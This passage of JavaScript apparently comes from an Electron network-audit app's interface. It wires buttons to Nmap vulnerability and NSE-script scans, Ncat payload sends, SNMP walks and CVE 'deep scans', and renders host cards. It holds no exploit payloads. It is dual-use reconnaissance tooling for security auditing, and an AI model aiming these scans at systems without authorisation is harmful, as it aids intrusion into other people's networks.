    nmapScanResults.style.display = 'none';
  });

  const btnRunNcat = document.getElementById('btn-run-ncat');
  if (btnRunNcat) {
    btnRunNcat.addEventListener('click', async () => {
      const portVal = document.getElementById('input-ncat-port').value;
      if (!portVal) {
        alert("Please specify a Target Port for Ncat.");
        return;
      }
      const isScanning = btnRunNcat.getAttribute('data-scanning') === 'true';
      if (isScanning) {
        if (btnRunNcat.getAttribute('data-scanning') === 'cancelling') return;
        btnRunNcat.setAttribute('data-scanning', 'cancelling');
        btnRunNcat.innerHTML = `<span class="icon">🛑</span> Stopping...`;
        api.cancelNmapScan(host.ip);
        return;
      }
      btnRunNcat.setAttribute('data-scanning', 'true');
      btnRunNcat.classList.add('pulsing');
      btnRunNcat.innerHTML = `<span class="icon">🔄</span> Running...`;

      let block = document.createElement('pre');
      block.id = `nmap-live-banner-ncat`;
      block.className = 'ds-banner selectable-text';
      nmapScanResults.prepend(block);
      block.innerText = 'Connecting via Ncat...';
      
      await api.runNcat({
         target: host.ip,
         port: portVal,
         payload: document.getElementById('input-ncat-payload').value
      });
    });
  }

  // --- SNMP Listeners ---
  const btnRunSnmp = document.getElementById('btn-run-snmp');
  const inputSnmpVersion = document.getElementById('input-snmp-version');
  const inputSnmpCommunity = document.getElementById('input-snmp-community');
  const snmpV3Auth = document.getElementById('snmp-v3-auth');
  
  if (inputSnmpVersion && snmpV3Auth) {
    inputSnmpVersion.addEventListener('change', (e) => {
      const isV3 = e.target.value === 'v3';
      snmpV3Auth.style.display = isV3 ? 'flex' : 'none';
      inputSnmpCommunity.style.display = isV3 ? 'none' : 'block';
    });
  }

  if (btnRunSnmp) {
    btnRunSnmp.addEventListener('click', async () => {
      await refreshSnmpBlacklist();
      if (btnRunSnmp.getAttribute('data-scanning') === 'true') {
        api.cancelSnmpWalk(host.ip);
        btnRunSnmp.innerHTML = `<span class="icon">🛑</span> Cancelling...`;
        btnRunSnmp.setAttribute('data-scanning', 'cancelling');
        return;
      }

      btnRunSnmp.setAttribute('data-scanning', 'true');
      btnRunSnmp.classList.add('pulsing', 'danger-pulsing');
      btnRunSnmp.classList.remove('info');
      btnRunSnmp.innerHTML = `<span class="icon">🛑</span> Cancel Walk...`;

      const dataContainer = document.getElementById('snmp-data-container');
      if (dataContainer) dataContainer.innerHTML = '';
      
      const btnExportSnmp = document.getElementById('btn-export-snmp');
      if (btnExportSnmp) btnExportSnmp.style.display = 'none';
      window.currentSnmpWalkData = [];
      
      const pContainer = document.getElementById('snmp-progress-container');
      if (pContainer) pContainer.style.display = 'block';

      const version = inputSnmpVersion.value;
      const options = { version };
      
      if (version === 'v1' || version === 'v2c') {
        options.community = inputSnmpCommunity.value || 'public';
      } else if (version === 'v3') {
        options.user = document.getElementById('input-snmp-user').value;
        options.authProtocol = document.getElementById('input-snmp-auth-proto').value;
        options.authKey = document.getElementById('input-snmp-auth-key').value;
        options.privProtocol = document.getElementById('input-snmp-priv-proto').value;
        options.privKey = document.getElementById('input-snmp-priv-key').value;
      }

      try {
        await api.snmpWalk(host.ip, options);
      } catch (e) {
        console.error("SNMP Walk start error:", e);
      }
    });
  }

  const btnExportSnmp = document.getElementById('btn-export-snmp');
  if (btnExportSnmp) {
    btnExportSnmp.onclick = () => {
       if (!window.currentSnmpWalkData || window.currentSnmpWalkData.length === 0) return;
       
       let csvContent = "OID,Name,Type,Value\n";
       window.currentSnmpWalkData.forEach(row => {
          const cleanValue = String(row.value).replace(/"/g, '""'); // Escape CSV quotes
          const typeMap = { 2: 'Integer', 4: 'OctetString', 5: 'Null', 6: 'OID', 64: 'IpAddress', 65: 'Counter', 66: 'Gauge', 67: 'TimeTicks', 68: 'Opaque' };
          const typeStr = typeMap[row.type] || `Type ${row.type}`;
          csvContent += `"${row.oid}","${row.name || ''}","${typeStr}","${cleanValue}"\n`;
       });
       
       const encodedUri = "data:text/csv;charset=utf-8," + encodeURIComponent(csvContent);
       const link = document.createElement("a");
       link.setAttribute("href", encodedUri);
       link.setAttribute("download", `snmp_walk_${host.ip}_${new Date().getTime()}.csv`);
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
    };
  }

  const btnRunPcap = document.getElementById('btn-run-pcap');
  if (btnRunPcap) {
    btnRunPcap.addEventListener('click', () => {
      const passivePanel = document.getElementById('passive-panel');
      const passiveResizer = document.getElementById('passive-resizer');
      openPanel(passivePanel, passiveResizer);
      
      const pcapTabBtn = document.querySelector('.modal-tab[data-passive-tab="pcap"]');
      if (pcapTabBtn) pcapTabBtn.click();
      
      const filterInput = document.getElementById('live-pcap-host');
      if (filterInput) filterInput.value = `host ${host.ip}`;
    });
  }

  btnRunDeepScan.addEventListener('click', async () => {
    if (btnRunDeepScan.getAttribute('data-scanning') === 'true') {
      api.cancelDeepScan(host.ip);
      btnRunDeepScan.innerHTML = `<span class="icon">🛑</span> Cancelling...`;
      btnRunDeepScan.setAttribute('data-scanning', 'cancelling');
      return;
    }

    btnRunDeepScan.setAttribute('data-scanning', 'true');
    btnRunDeepScan.classList.add('pulsing', 'danger-pulsing');
    btnRunDeepScan.classList.remove('warning');
    btnRunDeepScan.innerHTML = `<span class="icon">🛑</span> Cancel Scan...`;
    dsResults.innerHTML = ''; 
    
    const hostIdx = state.hosts.findIndex(h => h.ip === host.ip);
    if (hostIdx >= 0) {
      state.hosts[hostIdx].deepAudit = { history: [], vulnerabilities: 0, warnings: 0 };
    }
    await api.runDeepScan(host.ip);
  });

  const handleNmapScan = async (btnId, type, label) => {
    const btn = document.getElementById(btnId);
    if (btn.getAttribute('data-scanning') === 'true') {
      api.cancelNmapScan(type === 'port' ? `${host.ip}:${btn.getAttribute('data-port')}` : host.ip);
      btn.innerHTML = `<span class="icon">🛑</span> Cancelling...`;
      btn.setAttribute('data-scanning', 'cancelling');
      return;
    }

    btn.setAttribute('data-scanning', 'true');
    btn.classList.add('pulsing', 'danger-pulsing');
    btn.innerHTML = `<span class="icon">🛑</span> Cancel ${label}...`;

    let newBlock = document.createElement('div');
    newBlock.className = 'ds-record';
    newBlock.id = `nmap-live-${type}`;
    const labelDiv = document.createElement('div');
    labelDiv.className = 'ds-service';
    labelDiv.textContent = `Live Nmap ${label}`;
    
    const bannerDiv = document.createElement('div');
    bannerDiv.className = 'ds-banner';
    bannerDiv.id = `nmap-live-banner-${type}`;
    bannerDiv.textContent = 'Initializing...';
    
    newBlock.appendChild(labelDiv);
    newBlock.appendChild(bannerDiv);
    nmapScanResults.prepend(newBlock);

    await api.runNmapScan(type, type === 'port' ? `${host.ip}:${btn.getAttribute('data-port')}` : host.ip);
  };

  document.getElementById('btn-nmap-deep').addEventListener('click', () => handleNmapScan('btn-nmap-deep', 'deep', 'Deep Scan'));
  document.getElementById('btn-nmap-host').addEventListener('click', () => handleNmapScan('btn-nmap-host', 'host', 'Host Scan'));
  document.getElementById('btn-nmap-vuln').addEventListener('click', () => handleNmapScan('btn-nmap-vuln', 'vuln', 'Vuln Scan'));

  // NSE
  const nseSearchInput = document.getElementById('nse-search-input');
  const nseDropdown = document.getElementById('nse-dropdown');
  const btnNmapCustom = document.getElementById('btn-nmap-custom');
  const nseArgsInput = document.getElementById('nse-args-input');
  let selectedNseScript = null;

  if (nseSearchInput && nseDropdown) {
     function renderNseDropdown(filterText = '') {
        nseDropdown.innerHTML = '';
        if (!filterText) {
           nseDropdown.classList.remove('show');
           return;
        }

        const lowerFilter = filterText.toLowerCase();
        const matches = state.nmapScripts.filter(s => s.id.toLowerCase().includes(lowerFilter)).slice(0, 50);

        if (matches.length === 0) {
           nseDropdown.innerHTML = `<div style="padding: 8px; color: var(--text-muted); font-size: 11px;">No scripts found.</div>`;
        } else {
           matches.forEach(script => {
              const item = document.createElement('div');
              item.className = 'nse-dropdown-item';
              item.innerHTML = `<div style="font-weight: 500; color: var(--text-main);" class="nse-title-node"></div>`;
              item.querySelector('.nse-title-node').textContent = script.id;
              item.addEventListener('click', () => {
                 selectedNseScript = script.id;
                 nseSearchInput.value = script.id;
                 nseDropdown.classList.remove('show');
                 btnNmapCustom.disabled = false;
              });
              nseDropdown.appendChild(item);
           });
        }
        nseDropdown.classList.add('show');
     }

     nseSearchInput.addEventListener('input', (e) => {
        selectedNseScript = null;
        btnNmapCustom.disabled = true;
        renderNseDropdown(e.target.value);
     });
     document.addEventListener('click', (e) => {
        if (!nseSearchInput.contains(e.target) && !nseDropdown.contains(e.target)) {
           nseDropdown.classList.remove('show');
        }
     });

     btnNmapCustom.addEventListener('click', async () => {
        if (!selectedNseScript || btnNmapCustom.disabled) return;
        if (btnNmapCustom.getAttribute('data-scanning') === 'true') {
          api.cancelNmapScan(host.ip);
          btnNmapCustom.innerHTML = `<span class="icon">🛑</span> Cancelling...`;
          btnNmapCustom.setAttribute('data-scanning', 'cancelling');
          return;
        }

        btnNmapCustom.setAttribute('data-scanning', 'true');
        btnNmapCustom.classList.add('pulsing', 'danger-pulsing');
        btnNmapCustom.innerHTML = `<span class="icon">🛑</span> Cancel Custom Script...`;

        let newBlock = document.createElement('div');
        newBlock.className = 'ds-record';
        newBlock.id = `nmap-live-custom`;
    const labelDiv = document.createElement('div');
    labelDiv.className = 'ds-service';
    labelDiv.textContent = `Live NSE Execution (${selectedNseScript})`;
    
    const bannerDiv = document.createElement('div');
    bannerDiv.className = 'ds-banner';
    bannerDiv.id = 'nmap-live-banner-custom';
    bannerDiv.textContent = 'Initializing...';
    
    newBlock.appendChild(labelDiv);
    newBlock.appendChild(bannerDiv);
        nmapScanResults.prepend(newBlock);

        await api.runNmapScan('custom', {
           ip: host.ip,
           scriptName: selectedNseScript,
           args: nseArgsInput.value
        });
     });
  }

  document.querySelectorAll('.port-item').forEach(el => {
    el.addEventListener('click', () => {
       if (!state.isNmapInstalled) return alert('Nmap not installed');
       const port = el.getAttribute('data-port');
       btnEngineNmap.click();
       const btnId = `btn-nmap-port-${port}`;
       if (!document.getElementById(btnId)) {
          const newBtn = document.createElement('button');
          newBtn.id = btnId;
          newBtn.className = 'btn warning full-width';
          newBtn.setAttribute('data-port', port);
          const iconSpan = document.createElement('span');
          iconSpan.className = 'icon';
          iconSpan.textContent = '🎯';
          newBtn.appendChild(iconSpan);
          newBtn.append(` Nmap specific port: ${port}`);
          newBtn.addEventListener('click', () => handleNmapScan(btnId, 'port', `Port ${port} Scan`));
          nmapActions.appendChild(newBtn);
       }
       document.getElementById(btnId).click();
    });
  });
}

elements.btnCloseDetails.addEventListener('click', () => {
  elements.detailsPanel.classList.remove('open');
  const detailsResizer = document.getElementById('sidebar-resizer');
  if (detailsResizer) detailsResizer.style.display = 'none';
  elements.detailsPanel.style.width = '';
});

// Resizer logic
let activeResize = null;

document.addEventListener('mousemove', (e) => {
  if (!activeResize) return;
  const { panelEl, startX, startWidth } = activeResize;
  const newWidth = startWidth - (e.clientX - startX);
  if (newWidth > 300 && newWidth < Math.min(800, window.innerWidth - 100)) {
    panelEl.style.width = `${newWidth}px`;
  }
});

document.addEventListener('mouseup', () => {
  if (!activeResize) return;
  activeResize.resizerEl.classList.remove('is-resizing');
  document.body.style.cursor = '';
  activeResize = null;
});

function initResizer(resizerEl, panelEl) {
  if (!resizerEl || !panelEl) return;
  
  resizerEl.addEventListener('mousedown', (e) => {
    const startWidth = parseInt(document.defaultView.getComputedStyle(panelEl).width, 10);
    activeResize = { resizerEl, panelEl, startX: e.clientX, startWidth };
    resizerEl.classList.add('is-resizing');
    document.body.style.cursor = 'col-resize';
    e.preventDefault();
  });
}

const vlanResizer = document.getElementById('vlan-resizer');
const passiveResizer = document.getElementById('passive-resizer');

initResizer(vlanResizer, vlanPanel);
const passivePanel = document.getElementById('passive-panel');
initResizer(passiveResizer, passivePanel);
// elements.sidebarResizer manages detailsPanel
initResizer(elements.sidebarResizer, elements.detailsPanel);

function getSecurityBadgeData(host) {
  let posture = 'Unknown';
  let badgeClass = 'secondary';
  let icon = '❔';

  // Monitor state takes highest priority in the badge
  if (host.monitorStatus === 'offline') {
    return { posture: 'Offline', badgeClass: 'danger', icon: '💀' };
  }
  if (host.monitorAlerts?.length > 0) {
    const hasCritical = host.monitorAlerts.some(a => a.severity === 'critical');
    return {
      posture:    hasCritical ? 'Delta: Critical' : 'Delta: Warning',
      badgeClass: hasCritical ? 'danger' : 'warning',
      icon:       hasCritical ? '🔴' : '🟡',
    };
  }

  if (host.deepAudit && host.deepAudit.vulnerabilities > 0) {
      posture = `${host.deepAudit.vulnerabilities} Critical/High CVEs`;
      badgeClass = 'danger';
      icon = '🛑';
  } else if (host.deepAudit && host.deepAudit.warnings > 0) {
      posture = `${host.deepAudit.warnings} Medium/Low CVEs`;
      badgeClass = 'warning';
      icon = '⚠️';
  } else if ((host.deepAudit && host.deepAudit.history && host.deepAudit.history.length > 0) || (host.nmapData && host.nmapData.vuln)) {
      posture = 'Audited Secure';
      badgeClass = 'success';
      icon = '🛡️';
  } else if (host.ports && host.ports.length > 0) {
    const p = new Set(host.ports);
    if (p.has(21) || p.has(23) || p.has(3306) || p.has(1433) || p.has(27017)) {
       posture = 'Risky Ports';
       badgeClass = 'danger';
       icon = '🛑';
    } else if (p.has(80) || p.has(445) || p.has(135)) {
       posture = 'Exposed Services';
       badgeClass = 'warning';
       icon = '⚠️';
    } else {
       posture = 'Unscanned';
       badgeClass = 'secondary';
       icon = '❔';
    }
  } else {
    posture = 'Unscanned';
    badgeClass = 'secondary';
    icon = '❔';
  }

  return { posture, badgeClass, icon };
}

function updateSecurityBadgeDOM(host, container) {
  if (!container) return;
  const data = getSecurityBadgeData(host);
  const badgeSpan = document.createElement('span');
  badgeSpan.className = 'security-badge-span';
  badgeSpan.style.cssText = `font-size: 11px; padding: 2px 6px; border-radius: 4px; border: 1px solid var(--${data.badgeClass}); color: var(--${data.badgeClass}); background: rgba(0,0,0,0.2);`;
  badgeSpan.textContent = `${data.icon} ${data.posture}`;
  
  // Clear any existing badge content and append the DOM node
  container.innerHTML = '';
  container.appendChild(badgeSpan);
}

function getFilteredAndSortedHosts() {
  const ipTerm = elements.filterIp.value.toLowerCase();
  const osTerm = elements.filterOs.value.toLowerCase();
  const vendorTerm = elements.filterVendor.value.toLowerCase();
  
  let filteredHosts = state.hosts.filter((h) => {
    // Blacklist enforcement
    if (isBlacklisted(h)) return false;
    const matchIp = h.ip ? h.ip.toLowerCase().includes(ipTerm) : false;
    const matchOs = h.os ? String(h.os).toLowerCase().includes(osTerm) : false;
    const matchVendor = h.vendor ? String(h.vendor).toLowerCase().includes(vendorTerm) : false;
    return (ipTerm === '' || matchIp) && (osTerm === '' || matchOs) && (vendorTerm === '' || matchVendor);
  });

  const sortBy = elements.sortSelect.value;
  filteredHosts.sort((a, b) => {
    let valA = a[sortBy] || '';
    let valB = b[sortBy] || '';
    if (sortBy === 'ip') {
       try {
         const numA = Number(valA.split('.').map(n => (`000${n}`).slice(-3)).join(''));
         const numB = Number(valB.split('.').map(n => (`000${n}`).slice(-3)).join(''));
         valA = numA; valB = numB;
       } catch (e) {}
    } else {
       valA = String(valA).toLowerCase();
       valB = String(valB).toLowerCase();
    }
    if (valA < valB) return state.sortDirection === 'asc' ? -1 : 1;
    if (valA > valB) return state.sortDirection === 'asc' ? 1 : -1;
    return 0;
  });
  return filteredHosts;
}

function renderAllHosts() {
  const filteredHosts = getFilteredAndSortedHosts();
  elements.resultCountText.innerText = `Showing ${filteredHosts.length} of ${state.hosts.length} hosts`;
  
  if (filteredHosts.length > 0) {
    elements.scanAllGroup.style.display = 'inline-flex';
    elements.emptyState.classList.add('hidden');
  } else {
    elements.scanAllGroup.style.display = 'none';
    if (state.hosts.length === 0) {
      elements.emptyState.classList.remove('hidden');
    } else {
      elements.emptyState.classList.add('hidden');
    }
  }

  domUtils.applyViewStyle(state);

  const allCards = Array.from(elements.hostGrid.querySelectorAll('.host-card'));
  allCards.forEach(c => c.style.display = 'none');
  
  filteredHosts.forEach(host => {
     let card = document.getElementById(`host-${host.ip.replace(/\./g, '-')}`);
     if (!card) {
       card = createHostCardDOM(host);
     } else {
       card.style.display = '';
     }
     elements.hostGrid.appendChild(card);
  });
}

elements.filterIp.addEventListener('input', renderAllHosts);
elements.filterOs.addEventListener('input', renderAllHosts);
elements.filterVendor.addEventListener('input', renderAllHosts);
elements.sortSelect.addEventListener('change', renderAllHosts);

elements.btnSortDir.addEventListener('click', () => {
  state.sortDirection = state.sortDirection === 'asc' ? 'desc' : 'asc';
  elements.btnSortDir.innerText = state.sortDirection === 'asc' ? '⬇️' : '⬆️';
  renderAllHosts();
});

let renderTimeout;
function debouncedRenderAllHosts() {
  clearTimeout(renderTimeout);
  renderTimeout = setTimeout(() => renderAllHosts(), 100);
}

// --- Scan All Dropdown Logic ---
let scanAllType = 'native'; // 'native' | 'nmap-host' | 'nmap-vuln' | 'nmap-deep'

const scanAll = createScanAllOrchestrator({
  api,
  elements,
  getHosts: getFilteredAndSortedHosts,
  updateUI: () => {
    if (!scanAll.state.isRunning) {
      const labelText = document.querySelector('.scan-all-option.active')?.getAttribute('data-label') || 'Deep Scan All';
      const iconMap = { native: '⚡', 'nmap-host': '🖥️', 'nmap-vuln': '🛡️', 'nmap-deep': '☢️' };
      elements.btnDeepScanAll.querySelector('.icon').textContent = iconMap[scanAll.state.type] || '⚡';
      elements.scanAllLabel.textContent = labelText;
      if (scanAll.state.total > 0 && scanAll.state.completed === scanAll.state.total) {
        elements.statusText.innerText = `Scan all finished (${scanAll.state.total} hosts).`;
      }
      return;
    }
    
    // Calculate global percentage based on completed and active
    let activePercentageSum = 0;
    for (const ip of scanAll.state.active) {
      if (scanAll.state.hostProgress[ip] !== undefined) activePercentageSum += scanAll.state.hostProgress[ip];
    }
    let totalPercentageVal = 0;
    if (scanAll.state.total > 0) {
      const totalMaxProgress = scanAll.state.total * 100;
      const currentProgressTotal = (scanAll.state.completed * 100) + activePercentageSum;
      totalPercentageVal = Math.round((currentProgressTotal / totalMaxProgress) * 100);
    }

    if (scanAll.state.type === 'native') {
      elements.statusText.innerText = `Deep scanning: ${scanAll.state.completed}/${scanAll.state.total} hosts completed - ${totalPercentageVal}%`;
    } else {
      const activeList = [...scanAll.state.active].map(aip => {
        const p = scanAll.state.hostProgress[aip];
        return p !== undefined ? `${aip} (${p.toFixed(0)}%)` : aip;
      }).join(', ');
      const scanLabel = `Nmap ${scanAll.state.type.replace('nmap-', '')} scan`;
      elements.statusText.innerText = `${scanLabel}: ${scanAll.state.completed}/${scanAll.state.total} done | Active: ${activeList}`;
    }
    
    // Sync abort button state
    elements.btnDeepScanAll.querySelector('.icon').textContent = '🛑';
    elements.scanAllLabel.textContent = `Cancel (${scanAll.state.completed}/${scanAll.state.total})`;
  }
});

elements.btnScanAllMenu.addEventListener('click', (e) => {
  e.stopPropagation();
  elements.scanAllDropdown.classList.toggle('hidden');
});

// Close dropdown when clicking elsewhere
document.addEventListener('click', (e) => {
  if (!e.target.closest('.scan-all-group')) {
    elements.scanAllDropdown.classList.add('hidden');
  }
});

// Handle option selection
document.querySelectorAll('.scan-all-option').forEach(opt => {
  opt.addEventListener('click', () => {
    document.querySelectorAll('.scan-all-option').forEach(o => o.classList.remove('active'));
    opt.classList.add('active');
    scanAllType = opt.getAttribute('data-scan-type');
    scanAll.setType(scanAllType);
    const label = opt.getAttribute('data-label');
    elements.scanAllLabel.textContent = label;
    // Update the main button icon
    const iconMap = { native: '⚡', 'nmap-host': '🖥️', 'nmap-vuln': '🛡️', 'nmap-deep': '☢️' };
    elements.btnDeepScanAll.querySelector('.icon').textContent = iconMap[scanAllType] || '⚡';
    elements.scanAllDropdown.classList.add('hidden');
  });
});

elements.btnDeepScanAll.addEventListener('click', () => {
  if (scanAll.state.isRunning) {
    scanAll.cancel();
    return;
  }
  scanAll.start();
});

const MONITOR_STATUS_MAP = {
  online:  { className: 'mon-online',  title: lastSeen => `Monitor: online · ${fmtTime(lastSeen)}` },
  offline: { className: 'mon-offline', title: lastSeen => `Monitor: offline · last seen ${fmtTime(lastSeen)}` },
  changed: { className: 'mon-changed', title: lastSeen => `Monitor: state changed · ${fmtTime(lastSeen)}` },
};

function updateMonitorDotDOM(host, card) {
  if (!host.monitorStatus || !card) return;
  let dot = card.querySelector('.host-monitor-dot');
  if (!dot) {
    dot = document.createElement('span');
    dot.className = 'host-monitor-dot';
    card.querySelector('.host-header')?.appendChild(dot);
  }
  dot.className = 'host-monitor-dot';
  const cfg = MONITOR_STATUS_MAP[host.monitorStatus];
  if (cfg) {
    dot.classList.add(cfg.className);
    dot.title = cfg.title(host.monitorLastSeen);
  }
}

function buildHostCard(host) {
  const card = document.createElement('div');
  card.className = 'host-card glass-panel';
  card.id = `host-${host.ip.replace(/\\./g, '-')}`;
  if (host.monitorStatus) card.dataset.monitorStatus = host.monitorStatus;

  card.innerHTML = `
    <div class="status-indicator checking" title="Checking connectivity..."></div>
    <button class="btn-remove-host" title="Remove host">✕</button>
    <div class="host-header">
      <h3 class="host-ip-display"></h3>
      <p class="mac host-mac-display"></p>
    </div>
    <div class="host-body">
      <div class="info-row"><span class="label">Hostname:</span> <span class="value host-name-display"></span></div>
      <div class="info-row"><span class="label">OS:</span> <span class="value host-os-display"></span></div>
      <div class="info-row"><span class="label">Vendor:</span> <span class="value host-vendor-display"></span></div>
      <div class="security-badge-container"></div>
    </div>
    <div class="host-footer" style="padding-top: 8px;">
      <button class="btn info full-width btn-view">View Details</button>
    </div>
  `;
  card.querySelector('.host-ip-display').textContent = host.ip;
  card.querySelector('.host-mac-display').textContent = host.mac || 'Unknown MAC';
  card.querySelector('.host-name-display').textContent = host.hostname || 'Unknown';
  card.querySelector('.host-os-display').textContent = host.os || 'Unknown';
  card.querySelector('.host-vendor-display').textContent = host.vendor || 'Unknown';
  updateSecurityBadgeDOM(host, card.querySelector('.security-badge-container'));
  updateMonitorDotDOM(host, card);

  return card;
}

function attachHostCardBehavior(card, host) {
  // Add source badge next to IP if not discovered
  if (host.source && host.source !== 'discovered') {
    const badge = document.createElement('span');
    badge.className = `source-badge ${host.source}`;
    const sourceLabels = { manual: '📌 Manual', imported: '📄 Imported', 'nmap-import': '📥 Nmap' };
    badge.textContent = sourceLabels[host.source] || host.source;
    card.querySelector('.host-ip-display').appendChild(badge);
  }
  
  card.querySelector('.btn-view').addEventListener('click', () => openDetailsPanel(host));
  
  // Remove host button
  card.querySelector('.btn-remove-host').addEventListener('click', (e) => {
    e.stopPropagation();
    state.hosts = state.hosts.filter(h => h.ip !== host.ip);
    card.remove();
    renderAllHosts();
  });
  
  // Async ping check for real connectivity
  if (ipRegex.test(host.ip)) {
    api.pingHost(host.ip).then(result => {
      const indicator = card.querySelector('.status-indicator');
      if (!indicator) return;
      indicator.classList.remove('checking');
      if (result && result.alive) {
        indicator.classList.add('online');
        indicator.title = `Online (${result.time}ms)`;
      } else {
        indicator.classList.add('offline');
        indicator.title = 'Offline / Unreachable';
      }
    }).catch(() => {
      const indicator = card.querySelector('.status-indicator');
      if (indicator) {
        indicator.classList.remove('checking');
        indicator.classList.add('offline');
        indicator.title = 'Ping failed';
      }
    });
  }
}

function createHostCardDOM(host) {
  const card = buildHostCard(host);
  attachHostCardBehavior(card, host);
  return card;
}

function clearGrid() {
  state.hosts = [];
  elements.hostGrid.innerHTML = '';
  domUtils.applyViewStyle(state);
  elements.emptyState.classList.remove('hidden');
  elements.detailsPanel.classList.remove('open');
  elements.statusText.innerText = 'Ready to scan.';
  domUtils.setScanningState(false, state);
}

// Commands
elements.btnScan.addEventListener('click', async () => {
  const subnet = elements.interfaceSelect.value;
  if (!subnet) return alert('Select interface first.');
  domUtils.setScanningState(true, state);
  await api.scanNetwork(subnet);
});

elements.btnStop.addEventListener('click', async () => {
  domUtils.setScanningState(false, state);
  await api.stopScan();
});

elements.btnSave.addEventListener('click', async () => {
  const res = await api.saveResults(state.hosts);
  if (res.status === 'saved') elements.statusText.innerText = `Saved to ${res.path}`;
});

elements.btnLoad.addEventListener('click', async () => {
  const res = await api.loadResults();
  if (res.status === 'loaded' && res.data) {
    clearGrid();
    state.hosts = res.data;
    renderAllHosts();
  }
});

elements.btnClear.addEventListener('click', async () => {
  clearGrid();
  await api.clearResults();
});

elements.btnExit.addEventListener('click', () => {
  api.exitApp();
});

if (window.electronAPI) {
  window.electronAPI.onHostFound((hostData) => {
    const existingIdx = state.hosts.findIndex(h => h.ip === hostData.ip);
    if (existingIdx >= 0) {
      state.hosts[existingIdx] = { 
        ...state.hosts[existingIdx], 
        ...hostData,
        routing: state.hosts[existingIdx].routing || [],
        processes: state.hosts[existingIdx].processes || []
      };
    } else {
      state.hosts.push({
        ...hostData,
        routing: hostData.routing || [],
        processes: hostData.processes || []
      });
    }
    debouncedRenderAllHosts();
    
    // If scope modal is open, track discovered hosts for the footer counter
    if (!elements.scopeModalOverlay.classList.contains('hidden')) {
      discoverHostCount++;
      const discoverStatus = document.getElementById('discover-status');
      if (discoverStatus) {
        discoverStatus.textContent = `Discovered ${discoverHostCount} host${discoverHostCount !== 1 ? 's' : ''} so far...`;
      }
      updatePendingCount();
    }
  });

  window.electronAPI.onScanComplete(({ message }) => {
    domUtils.setScanningState(false, state);
    elements.statusText.innerText = message || `Scan complete. Found ${state.hosts.length} hosts.`;
  });

  window.electronAPI.onScanError(({ error }) => {
    domUtils.setScanningState(false, state);
    elements.statusText.innerText = `Scan error: ${error}`;
  });
  
  // Deep Scan Receivers
  window.electronAPI.onDeepScanProgress && window.electronAPI.onDeepScanProgress((data) => {
    const btnRunDeepScan = document.getElementById('btn-run-deep-scan');
    if (btnRunDeepScan && btnRunDeepScan.getAttribute('data-ip') === data.ip && btnRunDeepScan.getAttribute('data-scanning') === 'true') {
      btnRunDeepScan.innerHTML = `<span class="icon">🛑</span> Cancel Scan (${data.percent}%)`;
    }
    
    // Update global progress if part of Deep Scan All
    if (scanAll.state.isRunning && scanAll.state.active.has(data.ip)) {
      scanAll.onHostProgress(data.ip, data.percent);
    }

    // Update individual host card
    const card = document.getElementById(`host-${data.ip.replace(/\./g, '-')}`);
    if (card) {
      // Find the specific badge container for THIS card
      const badgeContainer = card.querySelector('.security-badge-container');
      if (badgeContainer) {
        let progressBadge = badgeContainer.querySelector('.ds-progress-badge');
        if (!progressBadge) {
          progressBadge = document.createElement('span');
          progressBadge.className = 'ds-progress-badge';
          progressBadge.style.cssText = 'font-size: 11px; padding: 2px 6px; border-radius: 4px; border: 1px solid var(--info); color: var(--text-main); background: rgba(94, 114, 235, 0.2); margin-left: 6px;';
          badgeContainer.appendChild(progressBadge);
        }
        progressBadge.innerHTML = `⏳ ${data.percent}%`;
      }
    }
  });

  window.electronAPI.onDeepScanResult((data) => {
    // 1. Permanently Save to Host State (For JSON Export & Live Score Retallying)
    const hostIdx = state.hosts.findIndex(h => h.ip === data.ip);
    if (hostIdx >= 0) {
       // Initialize structure if first port
       if (!state.hosts[hostIdx].deepAudit) {
         state.hosts[hostIdx].deepAudit = { history: [], vulnerabilities: 0, warnings: 0 };
       }
       
       // Deduplicate
       if (!state.hosts[hostIdx].deepAudit.history.some(h => h.port === data.port)) {
         state.hosts[hostIdx].deepAudit.history.push(data);
         if (data.vulnerable && data.severity === 'critical') state.hosts[hostIdx].deepAudit.vulnerabilities++;
         if (data.vulnerable && data.severity === 'warning') state.hosts[hostIdx].deepAudit.warnings++;
         
         // Dynamically re-render the card Security Badge safely
         const card = document.getElementById(`host-${data.ip.replace(/\./g, '-')}`);
         if (card) {
            const badgeContainer = card.querySelector('.security-badge-container');
            if (badgeContainer) updateSecurityBadgeDOM(state.hosts[hostIdx], badgeContainer);
         }
       }
    }

    // 2. Stream to Live Feed UI if panel is open
    const dsResults = document.getElementById('deep-scan-results');
    if (!dsResults) return; // Panel closed

    const record = document.createElement('div');
    record.className = 'ds-record';
    if (data.vulnerable) {
      record.style.borderLeftColor = 'var(--danger)';
      record.style.background = 'rgba(235,94,94,0.05)';
    }
    
    const headerNode = document.createElement('div');
    headerNode.className = 'ds-header';

    const titleDiv = document.createElement('div');
    titleDiv.className = 'ds-header-title';

    const portSpan = document.createElement('span');
    portSpan.className = 'ds-port';
    portSpan.textContent = `PORT ${data.port}`;

    const serviceSpan = document.createElement('span');
    serviceSpan.className = 'ds-service';
    serviceSpan.textContent = data.serviceName;

    titleDiv.appendChild(portSpan);
    titleDiv.appendChild(serviceSpan);

    if (data.vulnerable) {
      const cl = data.severity === 'critical' ? 'danger' : 'warning';
      const tag = document.createElement('span');
      tag.style.cssText = `font-size: 10px; color: var(--${cl}); border: 1px solid var(--${cl}); margin-left: 8px; padding: 2px 4px; border-radius: 2px;`;
      tag.textContent = data.severity.toUpperCase();
      titleDiv.appendChild(tag);
    }

    headerNode.appendChild(titleDiv);

    const actionsContainer = document.createElement('div');
    actionsContainer.className = 'ds-actions';
    const ip = document.getElementById('btn-run-deep-scan')?.getAttribute('data-ip');
    if (ip) {
      renderActionButtons(actionsContainer, ip, data);
    }
    headerNode.appendChild(actionsContainer);

    const detailsDiv = document.createElement('div');
    detailsDiv.className = 'ds-details';
    if (data.vulnerable) {
      detailsDiv.style.color = 'var(--danger)';
      detailsDiv.style.fontWeight = '500';
    }
    detailsDiv.textContent = data.details;

    record.appendChild(headerNode);
    record.appendChild(detailsDiv);

    if (data.rawBanner) {
      const bannerDiv = document.createElement('div');
      bannerDiv.className = 'ds-banner';
      bannerDiv.textContent = data.rawBanner;
      record.appendChild(bannerDiv);
    }
    
    dsResults.appendChild(record);
  });

  window.electronAPI.onDeepScanComplete(({ ip }) => {
    const btnRunDeepScan = document.getElementById('btn-run-deep-scan');
    if (btnRunDeepScan && btnRunDeepScan.getAttribute('data-ip') === ip) {
      const wasCancelled = btnRunDeepScan.getAttribute('data-scanning') === 'cancelling';
      
